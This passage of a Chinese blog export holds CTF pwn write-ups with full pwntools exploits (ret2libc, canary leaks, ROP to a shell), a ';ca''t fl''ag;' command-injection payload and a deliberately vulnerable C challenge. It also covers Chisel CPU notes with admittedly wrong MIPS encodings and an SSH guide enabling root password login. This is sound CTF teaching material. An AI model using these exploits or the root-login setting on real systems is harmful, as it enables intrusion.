RS2_out两个输出。\n\n定义一组32个寄存器，使用循环为寄存器附上初值，初始值内容为其编号。\n\n根据上面的图，RS1_out和RS2_out分别对应编号为RS1寄存器的内容和编号为RS2寄存器的内容，同时，WB_data将会被写入到编号为Reg_WB的寄存器中，这就是两读一写的功能。根据真实的regfile，还应有一个写使位用于控制寄存器是否写入，由于上图中没有，因此这里默认WB寄存器可写。\n\n此外，特别地，由于0号寄存器的值恒为0，因此在进行寄存器修改操作的时候若涉及到0寄存器则不对其做任何改动。\n\n\n\n测试代码：\n\n```scala\nimport org.scalatest.flatspec.AnyFlatSpec\nimport chisel3._\nimport chiseltest._\n\nclass RegisterFileSpec extends AnyFlatSpec with ChiselScalatestTester {\n  behavior of \"RegisterFile\"\n\n  it should \"correctly read and write registers\" in {\n    test(new RegisterFile).withAnnotations(Seq(WriteVcdAnnotation)) { c =>\n      // 设置输入信号\n      c.io.RS1.poke(5.U)\n      c.io.RS2.poke(8.U)\n      c.io.WB_data.poke(0x1234.U)\n      c.io.Reg_WB.poke(1.U)\n      c.clock.step()\n      // 验证输出结果和寄存器值\n      c.io.RS1_out.expect(5.U(32.W))\n      c.io.RS2_out.expect(8.U(32.W))\n\n      c.io.RS1.poke(1.U)\n      c.io.RS2.poke(0.U)\n      c.io.WB_data.poke(0x1234.U)\n      c.io.Reg_WB.poke(0.U)\n      c.clock.step()\n      c.io.RS1_out.expect(0x1234.U(32.W))\n      c.io.RS2_out.expect(0.U(32.W))\n\n      c.io.RS1.poke(0.U)\n      c.io.RS2.poke(8.U)\n      c.io.WB_data.poke(0x1234.U)\n      c.io.Reg_WB.poke(1.U)\n      c.clock.step()\n      c.io.RS1_out.expect(0.U(32.W))\n      c.io.RS2_out.expect(8.U(32.W))\n    }\n  }\n}\n```\n\n\n\n测试结果：\n\n![regfile测试结果](Chisel语言设计/image-20240120215825781.png)\n\n\n\n观察波形：\n\n![regfile波形1](Chisel语言设计/image-20240120215850113.png)\n\n![regfile波形2](Chisel语言设计/image-20240120215855284.png)\n\n![regfile波形3](Chisel语言设计/image-20240120215900146.png)\n\n使用三个时间周期进行验证，第一个时钟周期，输入RS1=5，RS2=8，WB_data=0x1234，Reg_WB=1，按照上面的设计，此时应当输出RS1_out=5,RS2_out=8.\n\n第二个时钟周期，输入RS1=1,RS2=0，WB_data=0x1234，Reg_WB=0。在上一个时间周期中，上一个WB_data，即0x1234应已被写入到1号寄存器中，此时的RS1_out=0x1234，RS2_out=0。\n\n第三个时间周期，输入RS1=0，RS2=8, WB_data=0x1234，Reg_WB=1。在上一个时间周期中，Reg_WB输入为0，WB_data=0x1234，由于0寄存器任何时候都为0，因此不会对0寄存器的值进行修改。此时RS1_out=0,RS2_out=8。\n\n根据上图波形，可以验证测试结果均正确。\n\n\n\n### 2.3 pc指令寄存器电路设计\n\n设计Instruction取指令部件：\n\n```scala\nclass InstructionStorage extends Module{\n    val io = IO(new Bundle{\n        val Instruction = Output(UInt(32.W))\n        val pc = Input(UInt(32.W))\n    })\n\n    val Instructions = RegInit(Reg(Vec(16, UInt(32.W))))\n    //存储4个预存的指令\n    Instructions(0) := \"b00000000001000100001100000100000\".U\n    Instructions(4) := \"b00000000000001010011000000100010\".U\n    Instructions(8) := \"b10001100101000100000000001100100\".U\n    Instructions(12) := \"b10101100101000100000000001101000\".U\n\n    io.Instruction := Instructions(io.pc)\n}\n```\n\nIO信号中定义输入为pc，输出为对应的指令。使用RegInit预存四个指令，依次为add R1,R2,R3; sub R0,R5,R6，lw R5,100(R2), sw R5,104(R2)的32位二进制数据，指令之间间隔4位，对应pc每次+4的操作。\n\n\n\n### 2.4 集合三个部件\n\n```scala\nimport chisel3._\nimport chisel3.util._\nimport chisel3.stage.ChiselStage\n\nclass PC extends Module{\n    val io = IO(new Bundle{\n        val pc = Input(UInt(32.W))\n        val RS1_out = Output(UInt(32.W))\n        val RS2_out = Output(UInt(32.W))\n        val add_op = Output(Bool())\n        val sub_op = Output(Bool())\n        val lw_op = Output(Bool())\n        val sw_op = Output(Bool())\n        val nop = Output(Bool())\n        //测试指令\n        val nowins = Output(UInt(32.W))\n    })\n\n    //创建三个部件实例\n    val InstructionDecoder = Module(new MIPSInstructionDecoder())\n    val Register  = Module(new RegisterFile())\n    val InstructionStorage = Module(new InstructionStorage())\n\n    //将不同部件之间的接口和最外层接口连接起来\n    this.io.nowins := InstructionDecoder.io.instr_word\n\n    InstructionDecoder.io.instr_word := InstructionStorage.io.Instruction\n    Register.io.RS1 := InstructionDecoder.io.Reg1\n    Register.io.RS2 := InstructionDecoder.io.Reg2\n\n    Register.io.WB_data := 0.U\n    Register.io.Reg_WB := 0.U\n\n    InstructionStorage.io.pc := this.io.pc\n    this.io.RS1_out := Register.io.RS1_out\n    this.io.RS2_out := Register.io.RS2_out\n    this.io.add_op := InstructionDecoder.io.add_op\n    this.io.sub_op := InstructionDecoder.io.sub_op\n    this.io.lw_op := InstructionDecoder.io.lw_op\n    this.io.sw_op := InstructionDecoder.io.sw_op\n    this.io.nop := InstructionDecoder.io.nop\n}\n\nobject PC extends App{\n    (new chisel3.stage.ChiselStage).emitVerilog(new PC(), Array(\"--target-dir\", \"generated\"))\n}\n```\n\nPC的IO信号中，输入为初始pc值，输出有RS1_out, RS2_out, 五种指令的检验位，还有一个从取指令器输出中外接的一个nowins，用于查看当前指令的值，便于检查是否出错。\n\n首先创建3个部件的实例，然后将三个部件之间以及PC和三个部件的输入输出接口对应连接起来。\n\n\n\n测试代码：\n```scala\nimport org.scalatest.flatspec.AnyFlatSpec\nimport chisel3._\nimport chiseltest._\n\nclass PCTest extends AnyFlatSpec with ChiselScalatestTester{\n    behavior of \"PC\"\n\n    it should \"pass\" in {\n        test(new PC).withAnnotations(Seq(WriteVcdAnnotation)) { c =>\n            //初始化pc\n            c.io.pc.poke(0.U)\n            c.clock.step()\n            for(i <- 0 until 4)\n            {\n                c.io.pc.poke((4*i).U)\n                println(\"Now pc: \" + 4*i)\n                //测试指令\n                println(\"Now instruction is: \" + c.io.nowins.peek().toString)\n                \n                println(\"RS1_out is: \" + c.io.RS1_out.peek().toString)\n                println(\"RS2_out is： \" + c.io.RS2_out.peek().toString)\n                println(\"add status: \" + c.io.add_op.peek().toString)\n                println(\"sub status: \" + c.io.sub_op.peek().toString)\n                println(\"lw status: \" + c.io.lw_op.peek().toString)\n                println(\"sw status: \" + c.io.sw_op.peek().toString)\n                println(\"nop status: \" + c.io.nop.peek().toString)\n                i match {\n                    case 0 =>\n                    c.io.add_op.expect(true.B)\n                    case 1 =>\n                    c.io.sub_op.expect(true.B)\n                    case 2 =>\n                    c.io.lw_op.expect(true.B)\n                    case 3 =>\n                    c.io.sw_op.expect(true.B)\n                }\n                c.clock.step()\n            }\n\n        }\n    }\n}\n```\n\n首先先令pc输入为0，保持一个时间周期作为初始化，然后进行四个时间周期的测试，输入的pc值依次+4，分别对应取四条不同的指令，根据结果检验是否正确。\n\n\n\n测试结果：\n\n![综合测试结果](Chisel语言设计/image-20240120220039561.png)\n\n测试通过，从输出的提示信息可以看到结果均正确，能够正常的进行取指令和译码的操作。\n\n\n\n波形图观察：\n\n![时钟周期1](Chisel语言设计/image-20240120220114663.png)\n\n第一个时间周期中，add_op为1，RS1_out=2,RS2_out=3，对应R2，R3两个读入数据的寄存器。\n\n\n\n![时钟周期2](Chisel语言设计/image-20240120220119422.png)\n\n第二个时间周期，sub_op=1,RS1_out=5, RS2_out=6,对应R5，R6两个读入数据的寄存器。\n\n\n\n![时钟周期3](Chisel语言设计/image-20240120220122477.png)\n\n第三个时间周期，lw_op=1，RS1_out=2，对应读取寄存器为R2。\n\n\n\n![时钟周期4](Chisel语言设计/image-20240120220125532.png)\n\n第四个时间周期，sw_op=1,RS1_out=2，对应写入的源寄存器为R2。\n\n\n\n## 3、特别说明\n\n最后要特别进行一点说明是，由于当时做实验的时候对于指令的格式理解与真实指令有误差，本文中构造的mips机器码并非真实mips指令对应的机器码。具体错误体现在：\n\n真实mips指令和机器码的对应关系如下：\n\n指令中的寄存器顺序是rd，rs，rt，  而机器码中，从左到右相关寄存器的顺序为rs，rt，rd\n\n以add指令为例，add r1, r2, r3，在机器码中的寄存器顺序就应该是r2，r3，r1.\n\n而在本文构造中，上述格式的指令机器码构造的顺序是r1，r2，r3，即完全按照指令中排列顺序构造，如果在真实环境下运行将会产生寄存器错位导致结果错误的情况。\n","tags":["计算机组成原理","Chisel","mips"],"categories":["Chisel"]},{"title":"2023香山杯初赛-Pwn WP","url":"/2023/11/05/2023香山杯初赛-Pwn-WP/","content":"\n# 2023香山杯初赛Pwn WP\n\n<!-- toc -->\n\n## move\n\n栈迁移+ret2libc\n\nexp:\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\n#p = process('./pwn')\np = remote('101.201.70.204', 18639)\n\nlibc = ELF('./libc.so.6')\nelf = ELF('./pwn')\n\nbuf = 0x12345678\ncash = 0x4050A0\npop_rdi_ret = 0x401353\nleave_ret = 0x4012e0\n\nrop = flat(pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x401268)\np.recvuntil(b'lets travel again!')\np.send(rop)\np.recvuntil(b'Input your setp number')\np.send(p32(buf))\n\npayload = b'a' * (0x30) + p64(cash-8) + p64(leave_ret)\np.sendafter(b'TaiCooLa', payload)\n\nputs_addr  =  u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nprint('puts_addr:', hex(puts_addr))\nlibc_base = puts_addr - libc.symbols['puts']\nprint(hex(libc_base))\n#exit(0)\n\nsys_addr = libc.symbols['system'] + libc_base\n\n\n#gdb.attach(p, 'b system')\nrop2 = flat(pop_rdi_ret, cash+0x18, sys_addr, b'/bin/sh\\x00')\n\np.recvuntil(b'lets travel again!')\np.send(rop2)\n\n\np.interactive()\n```\n\n\n\n\n\n## pwthon\n\n本题本地gdb调试会炸，直接打远程\n\n主要执行函数IDA反汇编：\n\n<img src=\"2023香山杯初赛-Pwn-WP/image-20231015164841667.png\" alt=\"image-20231015164841667\" style=\"zoom:67%;\" />\n\n\n\n\n\nexp:\n\n```python\nfrom pwn import *\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\n\n#p = process('./app.cpython-37m-x86_64-linux-gnu.so')\np = remote('101.201.35.76', 18098)\n\np.sendline(b'0')\np.recvuntil(b'Give you a gift ')\n#给出了print的地址\nprogram_base = int(p.recvline(keepends=True), 16) - 0x68b0\n#计算程序基地址\nprint('program_base:', hex(program_base))\n#gdb.attach(p, 'b *$rebase(0x9a33)')\np.sendline((b'%p.' * 40).ljust(0x100 - 1, b'\\x00'))\nfor i in range(37):\n    p.recvuntil(b'.')\ncanary = int(p.recvuntil(b'.', drop=True), 16)\nprint('canary:', hex(canary))\n#泄露canary\n#由于这里的print_chk函数有对%N$p的检测，不能直接定向泄露，因此采取爆破输出栈结构的方法，找到其中末字节为00的数据，大概率为canary\n\nelf = ELF('./app.cpython-37m-x86_64-linux-gnu.so')\nelf.address = program_base\nrop = ROP([elf])\nrop.call('puts', [elf.got['puts']])\nrop.call(program_base + 0x99f0)\n#0x99f0：主函数运行地址\n#构造第一条rop链，泄露puts的got表地址\n\np.send(b'a' * 0x108 + p64(canary) + b'a' * 8 + rop.chain())\np.recvuntil(b'.')\np.recvuntil(b'.')\n#返回到函数开始，会再输出一次地址，此时泄露的就是上一次rop中的puts地址\n\nlibc = ELF('./libc6_2.27-3ubuntu1.6_amd64.so')\n\nputs_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\n#接收puts真实地址\nlibc_base = puts_addr - libc.sym['puts']\nlibc.address = libc_base\nprint(hex(libc_base))\n#泄露libc基地址\n\nret_addr = next(elf.search(asm('ret')))\nrop2 = ROP([elf, libc])\nrop2.call('execve', [next(libc.search(b'/bin/sh\\x00')), 0, 0])\n#构造第二次rop链，直接getshell\n\np.send(b'b' * (0x100 - 1) + b'\\x00')\np.send(b'a' * 0x108 + p64(canary) + b'a' * 8 + rop2.chain())\n#第二次执行函数仍然有两次read，只有第二次read才能溢出\n\np.interactive()\n```\n\n","tags":["pwn"],"categories":["pwn"]},{"title":"在vscode使用ssh连接Linux虚拟机工作","url":"/2023/10/31/在vscode使用ssh连接Linux虚拟机工作/","content":"\n\n# 在vscode使用ssh连接Linux虚拟机工作\n\n<!-- toc -->\n\n最近发现一个用vscode远程操控虚拟机的方法，感觉比直接操作虚拟机顺滑多了(~~虚拟机有点卡~~)，在此记录一下。\n\n## 1、Kali Linux虚拟机安装openssh-server\n\n安装openssh-server\n\n```shell\nsudo apt-get install opensh-server\n```\n\n启动服务：\n\n```shell\nsudo service ssh start\n```\n\n可以使用下面的命令查看ssh服务状态：\n\n```bash\nsudo service ssh status\n```\n\n\n\n## 2、vscode中的配置\n\n安装Remote-SSH插件：\n\n![remote-ssh](在vscode使用ssh连接Linux虚拟机工作/image-20231031181914914.png)\n\n\n\n装好后按F1，选择添加SSH主机\n\n![option](在vscode使用ssh连接Linux虚拟机工作/image-20231031182341372.png)\n\n格式为： 用户名@主机ip，其中用户名随意，主机ip在虚拟机中，eth0对应的ip就是虚拟机ip\n\n![添加ssh主机](在vscode使用ssh连接Linux虚拟机工作/image-20231031182414538.png)\n\n<img src=\"在vscode使用ssh连接Linux虚拟机工作/image-20231031182620188.png\" alt=\"ip\" style=\"zoom:67%;\" />\n\n保存主机配置到配置文件：\n\n直接保存到默认文件即可，即 `C:\\Users\\Username\\.ssh\\config`\n\n![保存配置](在vscode使用ssh连接Linux虚拟机工作/image-20231031182740585.png)\n\n在配置文件设置端口：\n\n![配置文件](在vscode使用ssh连接Linux虚拟机工作/image-20231031182954829.png)\n\n\n\n> 注意：在配置完成后，需要在Remote-SSH的扩展设置中将配置文件的绝对路径添加进去，否则连接虚拟机的时候会因为vsc的权限不够而无法连接。\n>\n> ![添加路径](在vscode使用ssh连接Linux虚拟机工作/image-20231031183336527.png)\n\n\n\n## 3、连接到远程Linux虚拟机\n\n再次F1，Remote-SSH连接到主机：\n\n![连接主机](在vscode使用ssh连接Linux虚拟机工作/image-20231031183124291.png)\n\n点击后选择刚刚添加的主机ip就能打开远程连接窗口。\n\n选择系统为Linux，输入Linux账户的密码就能正常连接了。\n\n\n\n### 远程连接root用户的情况\n\n在连接到root用户的时候，出现了需要反复输入密码，密码正确却不能连接上的情况，这是虚拟机ssh服务配置文件安全性设置导致的。\n\n解决方法：\n\n* 编辑sshd_config文件\n  ```bash\n  sudo gedit /etc/ssh/sshd_config\n  ```\n\n* 注释掉 `PermitRootLogin without-password`，即` #PermitRootLogin without-password`\n  增加一行：` PermitRootLogin yes`\n\n* 重启ssh服务\n\n  ```bash\n  service ssh restart\n  ```\n\n再次尝试连接就能连上了。\n","tags":["vscode","Remote-SSH"],"categories":["vscode"]},{"title":"DASCTF × CBCTF-Pwn WP","url":"/2023/10/31/DASCTF-×-CBCTF-Pwn-WP/","content":"\n#  DASCTF × CBCTF-Pwn WP\n\n## GuestBook\n\n泄露 `canary` ，由于 `strcpy` 遇` \\x00` 截断因此输入两次覆盖正确canary\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = process('./GuestBook')\np = remote('node4.buuoj.cn', 27378)\nbackdoor = 0x4012C3\np.recvuntil(b'Please input your name: ')\np.send(b'a' * (0x20-8) + b'b')\np.recvuntil(b'ab')\ncanary = u64(p.recv(7).rjust(8, b'\\x00'))\nprint(hex(canary))\np.recvuntil(b'How many messages would you like to leave(MAX 4): ')\np.sendline(b'2')\npayload = b'a' * (0xa0-8) + p64(canary | 0x41) + b'b' * 8 + p64(backdoor)\np.sendline(payload)\n#gdb.attach(p, 'b *0x40141b')\npayload2 = b'b' * (0xa0-0x28) + b'\\x00'\np.sendline(payload2)\np.interactive()\n```\n\n\n\n## EASYBOX\n\n通过分析文件得出：`pingCommand `函数中可以输入ping命令的后半段并执行，执行前有 `check_ip `检测，使用 `''` 可以绕过 检测，正常执行命令，再使用`；`实现同行执行多条命令即可cat flag\n\n```python\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = process('./pwn2')\np = remote('node4.buuoj.cn',25837)\np.recvuntil(b'Please enter your name: ')\np.sendline(b'a')\np.sendline(b'PING')\np.recvuntil(b'Enter an IP address: ')\n#gdb.attach(p, 'b *0x4018b2')\np.sendline(b\";ca''t fl''ag;\")\np.interactive()\n```\n\n","tags":["pwn"],"categories":["pwn"]},{"title":"使用docker部署pwn题","url":"/2023/10/31/使用docker部署pwn题/","content":"\n# 使用docker部署pwn题\n\n<!-- toc -->\n\n本文的配置过程不一定是规范的，不过至少我按照下面的流程做是能够正常部署的。如有缺漏或错误请见谅。\n\n## Step 0 准备好要用的题目文件\n\n示例代码pwn.c\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n//对应的基本头文件\n\nvoid initialize()\n{\n    setbuf(stdin, NULL);\n    setbuf(stdout, NULL);\n    setbuf(stderr, NULL);\n}\n//初始化，可以解决在远程连接时不会自动输出前面的内容的问题\n\nvoid g1ft()\n{\n    puts(\"W0w, you have found Yuyuko's food!\");\n    system(\"/bin/sh\");\n}\n\nint main()\n{\n    char s[40];\n    initialize();\n    puts(\"Yuyuko sama lose her food.\");\n    puts(\"Can you find it?\");\n    read(0, s, 0x100);\n    puts(\"Zannen desu ne.\");\n    puts(\"Wish you can find it next time.\");\n    return 0;\n}\n```\n\n\n\n编译：\n\n```shell\ngcc -o ./pwn -g -fno-stack-protector -no-pie ./pwn.c\n# -fno-stack-protector 关闭canary\n# -no-pie 关闭PIE保护\n```\n\n\n\n\n\n## Step 1 Docker安装\n\n首先sudo apt update 一下\n\n安装docker：\n\n```shell\nsudo apt install docker.io      \n```\n\n检查安装情况：\n\n```shell\nsudo systemctl status docker\n```\n\n出现如下图所示的状态说明成功安装\n\n![install docker](使用docker部署pwn题/image-20230913150652699.png)\n\n\n\n## Step 2 安装并配置ctf_xinted\n\n```shell\ngit clone https://github.com/Eadom/ctf_xinetd.git\n```\n\n将代码克隆下来后，可能需要修改一下Dockerfile。\n\n具体来说，包含换源、在运行路径末尾添加斜杠等操作以防止某些错误的发生\n\n下面提供一个本次使用的Dockerfile：\n\n```dockerfile\nFROM ubuntu:jammy\n\nRUN sed -i 's@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g' /etc/apt/sources.list && \\\n    apt-get update && apt-get -y dist-upgrade && \\\n    apt-get install -y lib32z1 xinetd\n\nRUN useradd -m ctf\n\nWORKDIR /home/ctf/\n\nRUN cp -R /lib*/ /home/ctf/ && \\\n    cp -R /usr/lib*/ /home/ctf/\n\nRUN mkdir /home/ctf/dev/ && \\\n    mknod /home/ctf/dev/null c 1 3 && \\\n    mknod /home/ctf/dev/zero c 1 5 && \\\n    mknod /home/ctf/dev/random c 1 8 && \\\n    mknod /home/ctf/dev/urandom c 1 9 && \\\n    chmod 666 /home/ctf/dev/*\n\nRUN mkdir /home/ctf/bin/ && \\\n    cp /bin/sh /home/ctf/bin/ && \\\n    cp /bin/ls /home/ctf/bin/ && \\\n    cp /bin/cat /home/ctf/bin/\n\nCOPY ./ctf.xinetd /etc/xinetd.d/ctf\nCOPY ./start.sh /start.sh\nRUN echo \"Blocked by ctf_xinetd\" > /etc/banner_fail\n\nRUN chmod +x /start.sh\n\nCOPY ./bin/ /home/ctf/\nRUN chown -R root:ctf /home/ctf && \\\n    chmod -R 755 /home/ctf\n\nCMD [\"/start.sh\"]\n\nEXPOSE 9999\n```\n\n\n\n## Step 3 使用Docker部署题目\n\n* 注意：关于docker的操作要使用sudo\n\n\n\n导入ubuntu\n\n```shell\nsudo docker pull ubuntu:jammy\n```\n\n构建Docker镜像：\n\n```shell\ncd ./ctf_xinetd   #进入ctf_xinted目录下才能执行下面的指令\nsudo docker build ./ -t $name\n```\n\n创建容器：\n\n```shell\nsudo docker run -d -p 9999:9999 $name\n```\n\n出现如下就应该成功了：\n\n![docker run](使用docker部署pwn题/image-20230913164033738.png)\n\n连接到靶机：\n\n```shell\nnc localhost 9999\n```\n\n\n\n将外部文件导入到Docker中：\n\n```shell\nsudo docker pull $filename\n```\n\n将外部文件复制到Docker容器中：\n\n```shell\nsudo docker cp ctf_xinetd/Dockerfile a68f4951ca21:/\n```\n\n\n\n查看镜像中的容器：\n\n```shell\nsudo docker ps\n```\n\n![docker ps](使用docker部署pwn题/image-20230913165053078.png)\n\n操作容器：\n\n```shell\nsudo docker exec -it a68f4951ca21  bash\n```\n\n\n\n将题目部署到远程\n\n注册dockerhub账号，其中username作为将要使用的镜像源的名字\n\n![docker name](使用docker部署pwn题/image-20230913232458703.png)\n\n创建存储库：Repositories->Create repository\n\n![docker repository](使用docker部署pwn题/image-20230913232548016.png)\n\n![image-20230913232616321](使用docker部署pwn题/image-20230913232616321.png)\n\n镜像源名称格式（推荐）：小写英文，中间用-分割\n\n\n\n创建完成后，在虚拟机操作\n\n**首先要登录到dockerhub：**\n\n```shell\nsudo docker login\n```\n\n输入对应已经注册的dockerhub账号的用户名和密码\n\nbuild\n\n```shell\nsudo docker build ./ -t $username/所用镜像名\n# sudo docker build ./ -t t3uk1/yuyukos-food\n```\n\n将本地内容传到docker\n\n```shell\nsudo docker push t3uk1/yuyukos-food\n```\n\n运行容器\n\n```shell\nsudo docker run -d -p 9999:9999 t3uk1/yuyukos-food\n# 参数解析：\n# 将容器的9999端口绑定到主机9999端口，前面的是主机端口，后面的是容器对应端口\n```\n\n\n\nctf_xinted/bin中的两个文件分别是题目对应可执行文件和flag.txt\n\n在ctf_xinted文档中对应设置如下：\n\n```\nservice ctf\n{\n    disable = no\n    socket_type = stream\n    protocol    = tcp\n    wait        = no\n    user        = root\n    type        = UNLISTED\n    port        = 9999\n    bind        = 0.0.0.0\n    server      = /usr/sbin/chroot\n    # replace helloworld to your program\n    server_args = --userspec=1000:1000 /home/ctf ./pwn\n    banner_fail = /etc/banner_fail\n    # safety options\n    per_source\t= 10 # the maximum instances of this service per source IP address\n    rlimit_cpu\t= 20 # the maximum number of CPU seconds that the service may use\n    #rlimit_as  = 1024M # the Address Space resource limit for the service\n    #access_times = 2:00-9:00 12:00-24:00\n}\n```\n\n\n\npush成功之后应该就能远程访问了\n\n测试:\n\n```shell\nnc localhost 9999 #前面设置的端口是9999\n```\n\n\n\ndocker查看标签：\n\n```shell\nsudo docker image ls\n#sudo docker image rm xxx\n```\n\ndocker查看容器情况：\n\n```shell \nsudo docker container ls\n#sudo docker container rm xxx\n```\n\n\n\n\n\n## *设置题目动态flag的方法\n\n对于每一个创建的动态实例，每次创建的环境变量$FLAG是不同的，因此我们可以将这个环境变量作为题目flag的内容。\n\n一种实现方式是更改**<u>start.sh</u>**文件，在执行start命令前将$FLAG写入flag文件然后将 \\$ FLAG取消环境变量。\n\n```shell\n#!/bin/sh\n# Add your startup script\necho $FLAG > /home/ctf/flag\nchmod 644 /home/ctf/flag\nunset FLAG\n\n# DO NOT DELETE\n/etc/init.d/xinetd start\nsleep infinity\n```\n\n\n\n* 在Aurora靶场格式化设置动态flag\n\n  Whale->设置flag格式：\n\n  ```\n  {{ \"Aurora{\"+uuid.uuid4()|string+\"}\" }}\n  ```\n\n\n\n## 其他问题\n\n### 在指定glibc版本编译文件\n\n以ubuntu18为例\n\n运行docker容器：\n\n```shell\nsudo docker run -it -v <本地绝对路径>:/mnt/ ubuntu:bionic \nsudo docker run -it -v /home/yuyuko/mypwn/challenges/ret2libc/:/mnt/ ubuntu:bionic \n```\n\n安装gcc：\n\n```shell\napt update\napt-get install gcc\n#gcc编译\n```\n\n\n\n### 将文件在docker容器与本机中互相传输\n\n本机传输到docker容器：\n\n```shell\nsudo docker cp <本地文件绝对路径> <容器名称/容器id>:/\nsudo docker cp /home/yuyuko/mypwn/challenges/ret2libc/pwn.c 1e239edbeed0:/\n```\n\ndocker容器传输到本机：\n\n```shell\nsudo docker cp <容器名称/容器id>:/  <本地文件绝对路径>\nsudo docker cp  1e239edbeed0:/pwn /home/yuyuko/mypwn/challenges/ret2libc/\n```\n\n\n\n### 从docker编译的文件复制到本机后patch不成功\n\n原因：编译的时候权限是在docker中的root\n\n首先更改群组：\n\n![chown](使用docker部署pwn题/image-20231016233521857.png)\n\n在当前群组(yuyuko)权限下chmod\n\n```shell\n chmod 755 ./pwn \n```\n","tags":["pwn","docker"],"categories":["CTF","pwn"]},{"title":"记第一次出Pwn题——AuroraCTF2023第一批Pwn","url":"/2023/10/31/记第一次出Pwn题——AuroraCTF2023第一批Pwn/","content":"\n\n# 记第一次出Pwn题——AuroraCTF2023第一批Pwn\n\n<!-- toc -->\n\n~~这次新生赛pwn的题全都是我出的（恼）~~，虽然花了挺多时间的，但还是收获不少。\n\n如何使用docker部署pwn题看这里：<a href=\"https://t3uk1.github.io/2023/10/31/使用docker部署pwn题/\" target=\"_blank\">使用docker部署pwn题</a>\n\n下面是这次出的8道题的WP，考虑到面试与正式赛的时间间隔较短，且正式赛时间仅有2天，复现时间仅有7天，在出题的时候特意降低了难度，最难只到了ret2libc。~~出题人水平太菜了求轻喷（~~\n\n\n\n## 1.nc\n\n~~不会有人装了虚拟机还不会nc吧(~~\n\n\n\n## 2.nc2\n\n使用close(1)关闭了标准输出流\n\n```shell\nexec 1>&0\t\n```\n\n使用上面的指令重定向即可正常回显\n\n至于为什么找了个博客你们参考下：\n\nhttps://blog.csdn.net/xirenwang/article/details/104139866\n\nflag路径为gift/flag/flag\n\n~~没错flag外面还套了个叫flag的目录~~\n\n\n\n## 3.口算Master\n\n使用pwntools脚本完成交互即可\n\nexp：\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n\np = remote('actf-node.szu.moe', 10056)\n#p = process('./calc')\n\np.recvuntil(b\"U have 5 minutes to solve these challenges.\\n\")\nfor i in range(100):\n    challenge = p.recvline().decode().strip()\n    print(challenge)\n    num1, operator, num2, x, y = challenge.split(' ')\n\n    num1 = int(num1)\n    num2 = int(num2)\n    result = 0\n    \n    if operator == '+':\n        result = num1 + num2\n    elif operator == '-':\n        result = num1 - num2\n    elif operator == '*':\n        result = num1 * num2\n    elif operator == '/':\n        result = num1 / num2\n    elif operator == '%':\n        result = num1 % num2\n    elif operator == '&':\n        result = num1 & num2\n    elif operator == '|':\n        result = num1 | num2\n\n    p.sendline(str(result))\n    \np.interactive()\n```\n\n~~出题的时候本来想着加上% ,&,|运算的，结果生成的时候忘记改了所以你们做到的版本是只有加减乘除（~~\n\n不过问题不大，这道题就是用来让你们熟悉pwntools脚本交互的。\n\n\n\n## 4.寰宇蝗灾\n\n~~其实这道题一开始放上去的时候有个bug导致了非预期解就是在菜单的时候输入除了1和2的任意字符都可以直接爆出flag，后面检查才发现源代码有个地方循环没写好，多亏了研一师兄第一时间找到了这个bug~~\n\n考点：整数溢出\n\nIDA反汇编注意到success函数：\n\n<img src=\"记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023115622990.png\" alt=\"success\" style=\"zoom: 67%;\" />\n\n按x交叉引用知check函数调用了：\n\n<img src=\"记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023115655969.png\" alt=\"check\" style=\"zoom:80%;\" />\n\n分析得check函数的传入值为负数的时候就能调用success，回到主函数观察结构\n\n<img src=\"记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023120050449.png\" alt=\"main\" style=\"zoom:80%;\" />\n\n传入check的值是v5，初值为3，每轮循环会*2，v4初值为20，每轮循环中都会--，v4=0的时候退出循环，因此推测v4控制循环次数，共执行20轮循环。\n\n我们知道，3*2^20这个数是一个正数，这并不能满足check的条件，因此需要在attack中进行操作。\n\n下面先简单讲讲什么是整数溢出：\n\n```\n整数溢出\nint类型数据存储方式是以补码存储的，对于32位int来说，其最高位为符号位，符号位为0的时候表示正数，符号位为1表示负数\n符号位为0时，数据表示的数就是他本身（正数），符号位为1时，其表示的实际数据为-（每一位按位取反+1）的结果\n例如：\n32位int能表示的最大正数为2^31-1，用十六进制表示即为7FFF FFFF\n二进制表示为： \n0111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111\n符号位为0，是正数\n当这个数执行+1的操作时就变为\n1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 \n即8000 0000，符号位为1，是负数，这表示的是-2^31。\n两个同符号的数相加结果变成了另一种符号，这就是发生了溢出。\n```\n\n可以自己写个程序验证一下\n\n![intoverflow](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231025193713539.png)\n\n回到题目，在atack函数中\n\n<img src=\"记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023122638914.png\" alt=\"attack\" style=\"zoom:80%;\" />\n\n可以输入一个int类型的数来改变虫群的数量，在这里仅对输入值/2进行了判断，因此可以输入一个负的大数来令虫群数量溢出为负数，例如-2^32-1，由于检验的是输入值/2，因此在一个相当大的区间内的数都是符合条件的。但是在构造大负数的时候要注意不能过大，否则输入数本身就溢出为负数，这时候前面加个负号就从负数变为一个很大的正数，这样就不满足条件了。\n\n![success](记第一次出Pwn题——AuroraCTF2023第一批Pwn/image-20231023123214264.png)\n\n\n\n## 